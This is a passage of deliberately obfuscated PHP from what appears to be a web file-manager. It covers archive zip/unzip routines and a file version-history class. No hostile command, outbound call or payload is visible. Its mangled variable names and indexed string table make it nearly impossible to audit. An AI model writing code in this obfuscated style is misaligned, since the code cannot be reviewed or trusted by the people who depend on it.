$„ºœòş¢ = $ßªú÷»–[$À½½ÃÌ[32]] . $À½½ÃÌ[10] . $Å×•áôö; if (count($ŞàîÊôÕ) > 1) { $èƒÛÔÜ = IO::info($êô¦Å±); $„ºœòş¢ = $èƒÛÔÜ[$À½½ÃÌ[32]] . $À½½ÃÌ[10] . $Å×•áôö; } if ($©ÅïÂŒà) { $êô¦Å± = $©ÅïÂŒà; } } if ($İºĞê¼á->getType() == $À½½ÃÌ[109]) { $œ–æê² = self::init($êô¦Å±); $ÙóöÃ = $œ–æê²->getType() == $À½½ÃÌ[109] ? $êô¦Å± : get_path_father($İºĞê¼á->path); $ÙóöÃ = IO::getPathInner($ÙóöÃ); $ÙóöÃ = rtrim($ÙóöÃ, $À½½ÃÌ[8]) . $À½½ÃÌ[8]; mk_dir($ÙóöÃ); } else { $¨–È´“º = TEMP_FILES . $À½½ÃÌ[1281] . time() . rand_string(8) . $À½½ÃÌ[8]; mk_dir($¨–È´“º); file_put_contents($¨–È´“º . $À½½ÃÌ[1282], $À½½ÃÌ[12]); $ÙóöÃ = $¨–È´“º; } $‹µ®Åşœ = IO::info($ÙóöÃ); if (!$‹µ®Åşœ || !$‹µ®Åşœ[$À½½ÃÌ[236]]) { show_json(LNG($À½½ÃÌ[1283]), !1); } $‹Êñ—üÊ = self::zipFileList($ŞàîÊôÕ, $¨–È´“º); foreach ($‹Êñ—üÊ as $²“¹“´ => $Â±©Æıß) { $‹Êñ—üÊ[$²“¹“´] = self::iconvSystem($Â±©Æıß); } $ıœ´ÜæŒ = get_filename_auto($ÙóöÃ . $„ºœòş¢, $À½½ÃÌ[12], $‡šé±ú–); KodArchive::create(self::iconvSystem($ıœ´ÜæŒ), $‹Êñ—üÊ); if (!IO::exist($ıœ´ÜæŒ)) { if ($¨–È´“º) { del_dir($¨–È´“º); } write_log($À½½ÃÌ[1284] . $ıœ´ÜæŒ, $À½½ÃÌ[400]); show_json(LNG($À½½ÃÌ[1285]), !1); } if (!$¨–È´“º) { return $ıœ´ÜæŒ; } $æ·ı×à› = self::move($ıœ´ÜæŒ, $êô¦Å±, $‡šé±ú–); if ($¨–È´“º) { del_dir($¨–È´“º); } if (!$ıœ´ÜæŒ) { write_log($À½½ÃÌ[1286] . $ıœ´ÜæŒ . $À½½ÃÌ[1287] . $êô¦Å±, $À½½ÃÌ[400]); show_json(LNG($À½½ÃÌ[1285]), !1); } return $æ·ı×à›; } public static function unzip($•—‹û”«, $ëäÜŠà˜, $—ıç³¥ = "\55\x31", $š÷²®ªâ = "\162\x65\x70\x6c\141\x63\145") { $©í™Èï¼ =& $_SERVER[‹‰”››ê]; $Ê£ÈÕŒ¦ = parent::info($•—‹û”«); if (!$Ê£ÈÕŒ¦) { show_json(LNG($©í™Èï¼[1288]), !1); } $›çå¹¬— = IO::infoFullSimple($ëäÜŠà˜); if (!$›çå¹¬—) { $ëäÜŠà˜ = IO::mkdir($ëäÜŠà˜); } if (isset($›çå¹¬—[$©í™Èï¼[194]]) && trim($›çå¹¬—[$©í™Èï¼[87]], $©í™Èï¼[8]) != trim($ëäÜŠà˜, $©í™Èï¼[8])) { $¦Çğ‹Ó÷ = KodIO::make($›çå¹¬—[$©í™Èï¼[193]]); $–¢ÁÜ = IO::fileNameAuto($¦Çğ‹Ó÷, $›çå¹¬—[$©í™Èï¼[32]], REPEAT_RENAME_FOLDER, !0); $ëäÜŠà˜ = IO::mkdir($¦Çğ‹Ó÷ . $–¢ÁÜ); } $—ıç³¥ = $—ıç³¥ && $—ıç³¥ != $©í™Èï¼[1289] ? @json_decode($—ıç³¥, !0) : -1; $×°¤ú±  = self::unzipPart($•—‹û”«, $—ıç³¥); if (!$×°¤ú±  || !IO::exist($×°¤ú± [$©í™Èï¼[233]])) { show_json(LNG($©í™Èï¼[108]), !1); } $öÅ»ğÈ‡ = $×°¤ú± [$©í™Èï¼[1290]][count($×°¤ú± [$©í™Èï¼[1290]]) - 1]; if ($öÅ»ğÈ‡[$©í™Èï¼[1291]] == -1 || substr($öÅ»ğÈ‡[$©í™Èï¼[32]], -1, 1) == $©í™Èï¼[8]) { $ó“Á«²Ç = $×°¤ú± [$©í™Èï¼[1292]] . rand_string(10) . $©í™Èï¼[8]; mk_dir($ó“Á«²Ç); $ÍÚóéÊÛ = count($×°¤ú± [$©í™Èï¼[1290]]) == 1 ? IO::ext($•—‹û”«) : get_path_ext($×°¤ú± [$©í™Èï¼[233]]); $Åò Ä = KodArchive::extract(self::iconvSystem($×°¤ú± [$©í™Èï¼[233]]), $ó“Á«²Ç, $öÅ»ğÈ‡[$©í™Èï¼[1291]], $–¢ÁÜ, $ÍÚóéÊÛ); self::unzipErrorCheck($Åò Ä, array($©í™Èï¼[1293], $•—‹û”«, $ÍÚóéÊÛ, $ëäÜŠà˜, $×°¤ú± )); Hook::trigger($©í™Èï¼[1294], $ó“Á«²Ç); recursion_dir($ó“Á«²Ç, $‰‹àãìÓ, $›é§°ÑÁ, 0); $Åù‚öœø = array_merge($‰‹àãìÓ, $›é§°ÑÁ); $‹á¤Ü = array(); foreach ($Åù‚öœø as $¸œŒ—•°) { $Ü×ööÂÒ = IO::move(self::iconvApp($¸œŒ—•°), $ëäÜŠà˜, $š÷²®ªâ); if ($Ü×ööÂÒ) { $‹á¤Ü[] = $Ü×ööÂÒ; } } del_dir($ó“Á«²Ç); } else { $Ü×ööÂÒ = IO::move($×°¤ú± [$©í™Èï¼[233]], $ëäÜŠà˜, $š÷²®ªâ, get_path_this($öÅ»ğÈ‡[$©í™Èï¼[32]])); if ($Ü×ööÂÒ) { $‹á¤Ü[] = $Ü×ööÂÒ; } } return $‹á¤Ü ? $‹á¤Ü : !1; } public static function unzipList($ÑÇ÷é©) { $ş™¹‰âá =& $_SERVER[‹‰”››ê]; $Ñ—‰±ÌÉ = isset($ÑÇ÷é©[$ş™¹‰âá[1295]]) ? $ÑÇ÷é©[$ş™¹‰âá[1295]] : !1; $×üáÖ×Ë = isset($ÑÇ÷é©[$ş™¹‰âá[1291]]) ? @json_decode($ÑÇ÷é©[$ş™¹‰âá[1291]], !0) : -1; $º«·¤¨‘ = self::unzipPart($ÑÇ÷é©[$ş™¹‰âá[87]], $×üáÖ×Ë); if (!$º«·¤¨‘ || !IO::exist($º«·¤¨‘[$ş™¹‰âá[233]])) { show_json(LNG($ş™¹‰âá[108]), !1); } $™ÊÆÚ¸Š = $º«·¤¨‘[$ş™¹‰âá[1290]][count($º«·¤¨‘[$ş™¹‰âá[1290]]) - 1]; $‰ÛúÏÀ“ = in_array(IO::ext($º«·¤¨‘[$ş™¹‰âá[233]]), array($ş™¹‰âá[400], $ş™¹‰âá[1296], $ş™¹‰âá[1297], $ş™¹‰âá[1298], $ş™¹‰âá[1299], $ş™¹‰âá[1300])); if (!$Ñ—‰±ÌÉ && ($™ÊÆÚ¸Š[$ş™¹‰âá[1291]] == -1 || $‰ÛúÏÀ“)) { $‰¯˜à´¤ = $º«·¤¨‘[$ş™¹‰âá[1292]] . get_path_this($º«·¤¨‘[$ş™¹‰âá[233]]) . $ş™¹‰âá[1301]; if (!IO::exist($‰¯˜à´¤)) { $°¸ÔÄÎ = $™ÊÆÚ¸Š[$ş™¹‰âá[1291]] == -1 ? get_path_ext(IO::pathThis($ÑÇ÷é©[$ş™¹‰âá[87]])) : get_path_ext($º«·¤¨‘[$ş™¹‰âá[233]]); $ı²¹‚í = KodArchive::listContent(self::iconvSystem($º«·¤¨‘[$ş™¹‰âá[233]]), !0, $°¸ÔÄÎ); self::unzipErrorCheck($ı²¹‚í, array($ş™¹‰âá[1302], $ÑÇ÷é©, $º«·¤¨‘)); @file_put_contents($‰¯˜à´¤, json_encode($ı²¹‚í[$ş™¹‰âá[1303]])); } return @json_decode(IO::getContent($‰¯˜à´¤), !0); } IO::fileOut($º«·¤¨‘[$ş™¹‰âá[233]], $Ñ—‰±ÌÉ, get_path_this($™ÊÆÚ¸Š[$ş™¹‰âá[32]])); die; } private static function zipFileList($òšµ…ˆ, $Â¦÷¼»ß = false) { $âãìŒŸ‰ =& $_SERVER[‹‰”››ê]; $•ÆÇ¥“Ø = array(); foreach ($òšµ…ˆ as $É†Úß) { $İÀÊ’Ôó = $É†Úß[$âãìŒŸ‰[87]]; if ($Â¦÷¼»ß) { $İÀÊ’Ôó = self::copy($É†Úß[$âãìŒŸ‰[87]], $Â¦÷¼»ß, $âãìŒŸ‰[914]); } else { $Âİ£Á• = self::init($É†Úß[$âãìŒŸ‰[87]]); if ($Âİ£Á•->getType() == $âãìŒŸ‰[109]) { $İÀÊ’Ôó = $Âİ£Á•->path; } } if ($İÀÊ’Ôó && self::local()->exist($İÀÊ’Ôó)) { $•ÆÇ¥“Ø[$É†Úß[$âãìŒŸ‰[87]]] = $İÀÊ’Ôó; } } if (!empty($•ÆÇ¥“Ø)) { return array_values($•ÆÇ¥“Ø); } show_json(LNG($âãìŒŸ‰[1262]), !1); } private static function localFilePath($Ø­ŞÎıß) { $ùù¾¤Â =& $_SERVER[‹‰”››ê]; $‹øî¹Šå = KodIO::parse($Ø­ŞÎıß); if ($‹øî¹Šå[$ùù¾¤Â[33]] == KodIO::KOD_SOURCE) { $£ÃÕ¥éñ = Model($ùù¾¤Â[920])->fileInfoGet(KodIO::sourceID($Ø­ŞÎıß)); if (!$£ÃÕ¥éñ[$ùù¾¤Â[87]]) { show_json($ùù¾¤Â[1304], !1); } $Ø­ŞÎıß = $£ÃÕ¥éñ[$ùù¾¤Â[87]]; } $ËÉºô©— = self::init($Ø­ŞÎıß); if ($ËÉºô©—->pathParse[$ùù¾¤Â[1248]]) { $Ø­ŞÎıß = $ËÉºô©—->pathParse[$ùù¾¤Â[1248]]; $ËÉºô©— = self::init($Ø­ŞÎıß); } $ç“¶ããá = $ËÉºô©—->getType(); if ($ç“¶ããá == $ùù¾¤Â[109] || $ç“¶ããá == $ùù¾¤Â[1305]) { if (!$ËÉºô©—->exist($ËÉºô©—->path)) { show_json(LNG($ùù¾¤Â[108]), !1); } return $ËÉºô©—->path; } return !1; } public static function unzipPart($•‰ÉÒ‰¦, $¥¨ÄòÏ = -1) { $Ôæ²óÊÏ =& $_SERVER[‹‰”››ê]; $™§àÄø” = IO::pathThis($•‰ÉÒ‰¦); if (!$¥¨ÄòÏ || $¥¨ÄòÏ == -1) { $°¼‡´¡÷ = array(array($Ôæ²óÊÏ[32] => $™§àÄø”, $Ôæ²óÊÏ[1291] => -1)); $°¼‡´¡÷[0][$Ôæ²óÊÏ[1306]] = $°¼‡´¡÷[0][$Ôæ²óÊÏ[32]]; } else { if (is_array($¥¨ÄòÏ)) { $°¼‡´¡÷ = $¥¨ÄòÏ; $áèî¸Ô“ = count($°¼‡´¡÷) - 1; for ($öá„‹µÒ = 0; $öá„‹µÒ <= $áèî¸Ô“; $öá„‹µÒ++) { $œÕ§é¹ = $°¼‡´¡÷[$öá„‹µÒ]; $œÜ£Çô’ = get_path_this($œÕ§é¹[$Ôæ²óÊÏ[32]]) . (checkExtSafe($œÕ§é¹[$Ôæ²óÊÏ[32]]) ? $Ôæ²óÊÏ[12] : $Ôæ²óÊÏ[1307]); $°¼‡´¡÷[$öá„‹µÒ][$Ôæ²óÊÏ[1306]] = $Ôæ²óÊÏ[1308] . intval($œÕ§é¹[$Ôæ²óÊÏ[1291]]) . $Ôæ²óÊÏ[474] . $œÜ£Çô’; if ($öá„‹µÒ == 0) { continue; } $°¼‡´¡÷[$öá„‹µÒ][$Ôæ²óÊÏ[1306]] = $°¼‡´¡÷[$öá„‹µÒ - 1][$Ôæ²óÊÏ[1306]] . $Ôæ²óÊÏ[1309] . $°¼‡´¡÷[$öá„‹µÒ][$Ôæ²óÊÏ[1306]]; } } } if (!is_array($°¼‡´¡÷) || count($°¼‡´¡÷) == 0) { return !1; } $‚òÈî„ = $°¼‡´¡÷[count($°¼‡´¡÷) - 1]; if (!IO::exist($•‰ÉÒ‰¦)) { return !1; } $¸”à˜í¯ = TEMP_FILES . $Ôæ²óÊÏ[1310] . kodIO::hashPathSafe($•‰ÉÒ‰¦) . $Ôæ²óÊÏ[8]; $×°²ûşÔ = $¸”à˜í¯ . $‚òÈî„[$Ôæ²óÊÏ[1306]]; mk_dir($¸”à˜í¯); file_put_contents(TEMP_FILES . $Ôæ²óÊÏ[1282], $Ôæ²óÊÏ[12]); if (IO::exist($×°²ûşÔ)) { return array($Ôæ²óÊÏ[233] => $×°²ûşÔ, $Ôæ²óÊÏ[1290] => $°¼‡´¡÷, $Ôæ²óÊÏ[1292] => $¸”à˜í¯); } $Ì­¾­Ôì = self::localFilePath($•‰ÉÒ‰¦); if (!$Ì­¾­Ôì) { $Ì­¾­Ôì = $¸”à˜í¯ . $Ôæ²óÊÏ[1311]; if (!IO::exist($Ì­¾­Ôì)) { self::copy($•‰ÉÒ‰¦, $¸”à˜í¯, !1, get_path_this($Ì­¾­Ôì)); } } if (!$Ì­¾­Ôì || !IO::exist($Ì­¾­Ôì)) { return !1; } if ($‚òÈî„[$Ôæ²óÊÏ[1291]] == -1) { return array($Ôæ²óÊÏ[233] => $Ì­¾­Ôì, $Ôæ²óÊÏ[1290] => $°¼‡´¡÷, $Ôæ²óÊÏ[1292] => $¸”à˜í¯); } $ÜÏ¬İçç = $Ì­¾­Ôì; foreach ($°¼‡´¡÷ as $öá„‹µÒ => $œÕ§é¹) { if (!$œÕ§é¹ || $œÕ§é¹[$Ôæ²óÊÏ[1291]] == $Ôæ²óÊÏ[1289]) { break; } if (substr($œÕ§é¹[$Ôæ²óÊÏ[32]], -1, 1) == $Ôæ²óÊÏ[8]) { break; } $éøàÓ¼Í = in_array(get_path_ext($œÕ§é¹[$Ôæ²óÊÏ[1306]]), array($Ôæ²óÊÏ[400], $Ôæ²óÊÏ[1296], $Ôæ²óÊÏ[1297], $Ôæ²óÊÏ[1298], $Ôæ²óÊÏ[1299], $Ôæ²óÊÏ[1300])); $Æıé±ÙĞ = $öá„‹µÒ == count($°¼‡´¡÷) - 1 && $éøàÓ¼Í; $¿İáãì¼ = $¸”à˜í¯ . $œÕ§é¹[$Ôæ²óÊÏ[1306]]; $èîÖ¡ö¼ = $¸”à˜í¯ . get_path_this($œÕ§é¹[$Ôæ²óÊÏ[32]]); if (IO::exist($¿İáãì¼)) { $ÜÏ¬İçç = $¿İáãì¼; continue; } $¹­†É‚ = $öá„‹µÒ == 0 ? get_path_ext($™§àÄø”) : get_path_ext($ÜÏ¬İçç); $Èö‰»¥ğ = KodArchive::extract(self::iconvSystem($ÜÏ¬İçç), $¸”à˜í¯, $œÕ§é¹[$Ôæ²óÊÏ[1291]], $ı¡Ÿ”¸ë, $¹­†É‚); self::unzipErrorCheck($Èö‰»¥ğ, array($Ôæ²óÊÏ[1312], $•‰ÉÒ‰¦, $°¼‡´¡÷, $œÕ§é¹, $¿İáãì¼)); if (IO::exist($èîÖ¡ö¼)) { IO::rename($èîÖ¡ö¼, get_path_this($¿İáãì¼)); } $ÜÏ¬İçç = $¿İáãì¼; } $×°²ûşÔ = $ÜÏ¬İçç; return array($Ôæ²óÊÏ[233] => $ÜÏ¬İçç, $Ôæ²óÊÏ[1290] => $°¼‡´¡÷, $Ôæ²óÊÏ[1292] => $¸”à˜í¯); } private static function unzipErrorCheck($êƒŸÅÇ„, $ÇÙ‰»Ó½ = false) { $Ãüôïá­ =& $_SERVER[‹‰”››ê]; if ($êƒŸÅÇ„[$Ãüôïá­[1313]]) { return !0; } write_log(array($Ãüôïá­[1314], $êƒŸÅÇ„, $ÇÙ‰»Ó½), $Ãüôïá­[1315]); $ĞÁ¹õÊ = is_array($êƒŸÅÇ„[$Ãüôïá­[1303]]) ? json_encode($êƒŸÅÇ„[$Ãüôïá­[1303]]) : $êƒŸÅÇ„[$Ãüôïá­[1303]]; show_json($Ãüôïá­[1316] . $ĞÁ¹õÊ, !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $€ÀĞêş =& $_SERVER[‹‰”››ê]; $‹€€á£ß = $GLOBALS[$€ÀĞêş[6]][$€ÀĞêş[92]]; if ($‹€€á£ß[$€ÀĞêş[1317]] != 1) { return; } if ($‹€€á£ß[$€ÀĞêş[1318]] <= 0) { return; } if (isset($_REQUEST[$€ÀĞêş[1319]]) && $_REQUEST[$€ÀĞêş[1319]] == $€ÀĞêş[91]) { return; } Hook::bind($€ÀĞêş[1320], $€ÀĞêş[1321]); Hook::bind($€ÀĞêş[1322], $€ÀĞêş[1323]); Hook::bind($€ÀĞêş[1324], $€ÀĞêş[1325]); Hook::bind($€ÀĞêş[1326], $€ÀĞêş[1327]); Hook::bind($€ÀĞêş[1328], $€ÀĞêş[1329]); Hook::bind($€ÀĞêş[1330], $€ÀĞêş[1331]); } public static function eventBeforeUpload($ó‘¸ßøï) { if ($ó‘¸ßøï[3] && $ó‘¸ßøï[3] != REPEAT_REPLACE) { return; } $ƒˆÉ¨ƒ = self::parsePath($ó‘¸ßøï[0]); if (!$ƒˆÉ¨ƒ) { return; } self::add($ƒˆÉ¨ƒ); } public static function eventBeforeEdit($ŞŠü„È¢) { $‹®ú‰˜÷ = self::parsePath($ŞŠü„È¢[0]); if (!$‹®ú‰˜÷) { return; } self::add($‹®ú‰˜÷); } public static function eventBeforeCopyFile($¶î‰â²ö, $Ÿ‡ş°Ö, $²—ûêÏÃ, $ôœôßšƒ, $ÑÆéßò€, $ç°ó€Ö«) { $Ïà£ğ =& $_SERVER[‹‰”››ê]; if (isset($²—ûêÏÃ->_data[$Ïà£ğ[1252]]) && $²—ûêÏÃ->_data[$Ïà£ğ[1252]]) { return; } $„•‚àÀ´ = $²—ûêÏÃ->getPathOuter($ôœôßšƒ); $œ§ ò§ï = self::parsePath($„•‚àÀ´); if (!$œ§ ò§ï) { return; } self::add($œ§ ò§ï); } public static function eventBeforeRename($·“ÁÔ¶î) { $¦µ Èá =& $_SERVER[‹‰”››ê]; $ğ×¬…Ø÷ = self::parsePath($·“ÁÔ¶î[0]); if (!$ğ×¬…Ø÷) { return; } $ô‡çÍ´ = self::checkInHistory($ğ×¬…Ø÷); if (!$ô‡çÍ´) { return; } if ($ô‡çÍ´[$¦µ Èá[33]] == $¦µ Èá[233]) { $øÁ§ë”— = self::listData($ğ×¬…Ø÷); if ($øÁ§ë”— && $øÁ§ë”—[$¦µ Èá[457]]) { self::moveHistory($ğ×¬…Ø÷, $·“ÁÔ¶î[1]); } } else { IO::rename($ô‡çÍ´[$¦µ Èá[87]], $·“ÁÔ¶î[1]); } } public static function eventBeforeMove($ò¤­…€€) { $ŠˆÊ×›¨ =& $_SERVER[‹‰”››ê]; $¡è½¨ = self::parsePath($ò¤­…€€[0]); if (!$¡è½¨) { return; } $õ›ëèÄ = self::parsePath($ò¤­…€€[1]); if (!$õ›ëèÄ) { return; } $¤ªáè÷¢ = $ò¤­…€€[3]; $½è³”“ = self::checkInHistory($¡è½¨); if (!$½è³”“) { return; } $´ÁÔ€áÖ = self::pathHistory($õ›ëèÄ); if ($½è³”“[$ŠˆÊ×›¨[33]] == $ŠˆÊ×›¨[233]) { $®ùæ—£ª = self::listData($¡è½¨); $©‹İµ©Ô = rtrim($õ›ëèÄ, $ŠˆÊ×›¨[8]) . $ŠˆÊ×›¨[8] . ($¤ªáè÷¢ ? $¤ªáè÷¢ : get_path_this($¡è½¨)); $»Ç—‹ì = self::listData($©‹İµ©Ô); if ($®ùæ—£ª && $®ùæ—£ª[$ŠˆÊ×›¨[457]] && $»Ç—‹ì && $»Ç—‹ì[$ŠˆÊ×›¨[457]]) { return self::clear($¡è½¨); } if ($®ùæ—£ª && $®ùæ—£ª[$ŠˆÊ×›¨[457]]) { self::moveHistory($¡è½¨, $¤ªáè÷¢, $´ÁÔ€áÖ); } } else { IO::move($½è³”“[$ŠˆÊ×›¨[87]], $´ÁÔ€áÖ, !1, $¤ªáè÷¢); self::clearEmptyFolder(IO::pathFather($½è³”“[$ŠˆÊ×›¨[87]])); } } public static function eventAfterRemove($à¡’Ôº, $éÅÚ—Œœ) { $‹û“ĞÃ =& $_SERVER[‹‰”››ê]; if (!$éÅÚ—Œœ) { return; } $íğæ°ı˜ = self::parsePath($à¡’Ôº[0]); if (!$íğæ°ı˜) { return; } $·Ó÷ø™ = self::checkInHistory($íğæ°ı˜); if (!$·Ó÷ø™) { return; } if ($·Ó÷ø™[$‹û“ĞÃ[33]] == $‹û“ĞÃ[233]) { $Ò—‹‡ƒ = self::listData($íğæ°ı˜, !1); if ($Ò—‹‡ƒ && $Ò—‹‡ƒ[$‹û“ĞÃ[457]]) { self::clear($íğæ°ı˜, !1); } } else { IO::remove($·Ó÷ø™[$‹û“ĞÃ[87]]); self::clearEmptyFolder(IO::pathFather($·Ó÷ø™[$‹û“ĞÃ[87]])); } } private static function checkInHistory($«ìûŞ¿) { $û™Ü¨Ş„ = self::pathHistory($«ìûŞ¿); if (!IO::exist($û™Ü¨Ş„)) { $û™Ü¨Ş„ .= $_SERVER[‹‰”››ê][1332]; } return IO::exist($û™Ü¨Ş„) ? IO::info($û™Ü¨Ş„) : !1; } private static function parsePath($ØÜŒÇÑÄ) { $ÜÖÈØÃæ =& $_SERVER[‹‰”››ê]; if (!$ØÜŒÇÑÄ) { return !1; } if (isset($GLOBALS[$ÜÖÈØÃæ[1333]]) && $GLOBALS[$ÜÖÈØÃæ[1333]]) { return; } $É«Û­Æï = KodIO::parse($ØÜŒÇÑÄ); $·şÊñ“ = $É«Û­Æï[$ÜÖÈØÃæ[33]]; $ŞÓ´ª = !$·şÊñ“ || $·şÊñ“ == KodIO::KOD_IO || $·şÊñ“ == KodIO::KOD_SHARE_ITEM; if (!$ŞÓ´ª || !$É«Û­Æï[$ÜÖÈØÃæ[1334]]) { return !1; } if (substr($ØÜŒÇÑÄ, 0, strlen(DATA_PATH . $ÜÖÈØÃæ[1335])) == DATA_PATH . $ÜÖÈØÃæ[1335]) { return !1; } if ($·şÊñ“ == KodIO::KOD_SHARE_ITEM) { $‰¦ó¯É± = IO::init($ØÜŒÇÑÄ); if ($‰¦ó¯É±->pathParse[$ÜÖÈØÃæ[1248]]) { return self::parsePath($‰¦ó¯É±->pathParse[$ÜÖÈØÃæ[1248]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Š¿òß = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ÜÖÈØÃæ[1336]); foreach ($Š¿òß as $¦®ÖÖÎ) { if (!$·şÊñ“ && substr($ØÜŒÇÑÄ, 0, strlen($¦®ÖÖÎ)) == $¦®ÖÖÎ) { return !1; } } self::log($GLOBALS[$ÜÖÈØÃæ[1243]] . $ÜÖÈØÃæ[1337] . $ØÜŒÇÑÄ); return $ØÜŒÇÑÄ; } private static function pathHistory($ã¥ÑÉÙ») { $ıªëîöÙ =& $_SERVER[‹‰”››ê]; $¬˜²úö· = self::$_historyBase . ltrim(KodIO::clear($ã¥ÑÉÙ»), $ıªëîöÙ[8]); $¬˜²úö· = str_replace(array($ıªëîöÙ[1338]), array($ıªëîöÙ[1339]), $¬˜²úö·); return $¬˜²úö·; } public static function log($•ú‰ªØ‚) { } public static function historyCount($¬úÆ”²) { $¨´û›–¥ =& $_SERVER[‹‰”››ê]; $ìâÕ÷œ‡ = array(); $ÊŞàÒ = array(); foreach ($¬úÆ”² as $Ü™üÛƒÊ) { $ş¸Åòß» = get_path_father($Ü™üÛƒÊ); if (!$ÊŞàÒ[$ş¸Åòß»]) { $ÊŞàÒ[$ş¸Åòß»] = array(); } $ÊŞàÒ[$ş¸Åòß»][] = get_path_this($Ü™üÛƒÊ); } foreach ($ÊŞàÒ as $ş¸Åòß» => $ãûŒ¯£‹) { $ï™ÕÌÔ = self::parsePath($ş¸Åòß»); if (!$ï™ÕÌÔ) { continue; } foreach ($ãûŒ¯£‹ as $Ò„À¸şç) { $Ç´ùâı = self::listData(rtrim($ï™ÕÌÔ, $¨´û›–¥[8]) . $¨´û›–¥[8] . $Ò„À¸şç, !1); if ($Ç´ùâı && $Ç´ùâı[$¨´û›–¥[457]]) { $ìâÕ÷œ‡[rtrim($ş¸Åòß», $¨´û›–¥[8]) . $¨´û›–¥[8] . $Ò„À¸şç] = count($Ç´ùâı[$¨´û›–¥[457]]); } } } return $ìâÕ÷œ‡; } public static function add($Ä×‰şÄô) { $ÂÈñ±¶ö =& $_SERVER[‹‰”››ê]; $×¹ùÀÌÏ = self::listData($Ä×‰şÄô); if (!$×¹ùÀÌÏ) { return; } $ëš–ÂØ• = Model($ÂÈñ±¶ö[860])->get($ÂÈñ±¶ö[1340]); $Ãøêö‡ = intval($GLOBALS[$ÂÈñ±¶ö[6]][$ÂÈñ±¶ö[92]][$ÂÈñ±¶ö[1318]]); $¥ó×ù°¼ = $ëš–ÂØ• == $ÂÈñ±¶ö[1341] ? min(5, $Ãøêö‡) : $Ãøêö‡; if ($Ãøêö‡ <= 0) { return; } $—Œß¦— = IO::info($Ä×‰şÄô); $À°Àñ¨ß = $×¹ùÀÌÏ[$ÂÈñ±¶ö[457]]; if ($—Œß¦—[$ÂÈñ±¶ö[79]] == 0) { return; } if ($—Œß¦—[$ÂÈñ±¶ö[79]] >= 1024 * 1024 * 500) { return !1; } $É©¥†şá = IO::hashSimple($Ä×‰şÄô); if ($À°Àñ¨ß && $À°Àñ¨ß[0][$ÂÈñ±¶ö[689]] == $É©¥†şá) { return !0; } if (array_key_exists($ÂÈñ±¶ö[236], $—Œß¦—) && !$—Œß¦—[$ÂÈñ±¶ö[236]]) { return !1; } $µöÌ¡Üš = short_id(time()); $´Ş­‰ÌÌ = array($ÂÈñ±¶ö[487] => $µöÌ¡Üš, $ÂÈñ±¶ö[689] => $É©¥†şá, $ÂÈñ±¶ö[32] => $—Œß¦—[$ÂÈñ±¶ö[32]] . $ÂÈñ±¶ö[10] . date($ÂÈñ±¶ö[1342]) . rand_string(1), $ÂÈñ±¶ö[79] => $—Œß¦—[$ÂÈñ±¶ö[79]], $ÂÈñ±¶ö[539] => USER_ID, $ÂÈñ±¶ö[234] => time(), $ÂÈñ±¶ö[1343] => $ÂÈñ±¶ö[12]); IO::mkdir($×¹ùÀÌÏ[$ÂÈñ±¶ö[1344]]); $ËíŒ¹Èî = IO::copy($Ä×‰şÄô, $×¹ùÀÌÏ[$ÂÈñ±¶ö[1344]], !1, $´Ş­‰ÌÌ[$ÂÈñ±¶ö[32]]); if (!$ËíŒ¹Èî) { self::clearEmptyFolder($×¹ùÀÌÏ[$ÂÈñ±¶ö[1344]]); return !1; } array_unshift($À°Àñ¨ß, $´Ş­‰ÌÌ); if (count($À°Àñ¨ß) > $¥ó×ù°¼) { $ïŒ®Û¤Õ = array_slice($À°Àñ¨ß, $¥ó×ù°¼); foreach ($ïŒ®Û¤Õ as $²ö­Ùğ) { IO::remove($×¹ùÀÌÏ[$ÂÈñ±¶ö[1344]] . $²ö­Ùğ[$ÂÈñ±¶ö[32]]); } $À°Àñ¨ß = array_slice($À°Àñ¨ß, 0, $¥ó×ù°¼); } return self::saveData($×¹ùÀÌÏ[$ÂÈñ±¶ö[1345]], $À°Àñ¨ß); } public static function remove($ğíÇ—œ, $ÊŒÏ­†Ü) { $˜Á‰¢µœ =& $_SERVER[‹‰”››ê]; $†·œ¦šé = self::listData($ğíÇ—œ); $è­“åú¢ = array(); if (!$†·œ¦šé) { return !1; } foreach ($†·œ¦šé[$˜Á‰¢µœ[457]] as $•‰îÎ²–) { if ($•‰îÎ²–[$˜Á‰¢µœ[487]] == $ÊŒÏ­†Ü) { IO::remove($†·œ¦šé[$˜Á‰¢µœ[1344]] . $•‰îÎ²–[$˜Á‰¢µœ[32]]); continue; } $è­“åú¢[] = $•‰îÎ²–; } return self::saveData($†·œ¦šé[$˜Á‰¢µœ[1345]], $è­“åú¢); } public static function clear($şïÏóÏ·, $œİÂ«»¨ = true) { $î³ï™†¶ =& $_SERVER[‹‰”››ê]; $€ÊÏõı÷ = self::listData($şïÏóÏ·, $œİÂ«»¨); if (!$€ÊÏõı÷) { return !1; } foreach ($€ÊÏõı÷[$î³ï™†¶[457]] as $˜—ÜŒÀè) { IO::remove($€ÊÏõı÷[$î³ï™†¶[1344]] . $˜—ÜŒÀè[$î³ï™†¶[32]]); } return self::saveData($€ÊÏõı÷[$î³ï™†¶[1345]], array()); } public static function moveHistory($È²‡Ä³İ, $’¢¬¹ñú = '', $€ùÔš’ú = '') { $“×í»åÆ =& $_SERVER[‹‰”››ê]; $ĞÚŠ¨ñ = self::listData($È²‡Ä³İ, !1); if (!$ĞÚŠ¨ñ || !$ĞÚŠ¨ñ[$“×í»åÆ[457]]) { return !1; } $÷ÂŸ‚¬Ê = $“×í»åÆ[1332]; $’¢¬¹ñú = $’¢¬¹ñú ? $’¢¬¹ñú : get_path_this($È²‡Ä³İ); $€ùÔš’ú = $€ùÔš’ú ? $€ùÔš’ú : $ĞÚŠ¨ñ[$“×í»åÆ[1344]]; $ŠûÄï‰ì = substr(get_path_this($ĞÚŠ¨ñ[$“×í»åÆ[1345]]), 0, -strlen($÷ÂŸ‚¬Ê)); foreach ($ĞÚŠ¨ñ[$“×í»åÆ[457]] as $÷î¤Ò¬× => $ˆ¬‹€Š´) { $§ºàğ¨ = $’¢¬¹ñú . substr($ˆ¬‹€Š´[$“×í»åÆ[32]], strlen($ŠûÄï‰ì)); $™›²€Œ = IO::move($ĞÚŠ¨ñ[$“×í»åÆ[1344]] . $ˆ¬‹€Š´[$“×í»åÆ[32]], $€ùÔš’ú, !1, $§ºàğ¨); if ($™›²€Œ) { $ĞÚŠ¨ñ[$“×í»åÆ[457]][$÷î¤Ò¬×][$“×í»åÆ[32]] = $§ºàğ¨; } } $ĞÚŠ¨ñ[$“×í»åÆ[1345]] = 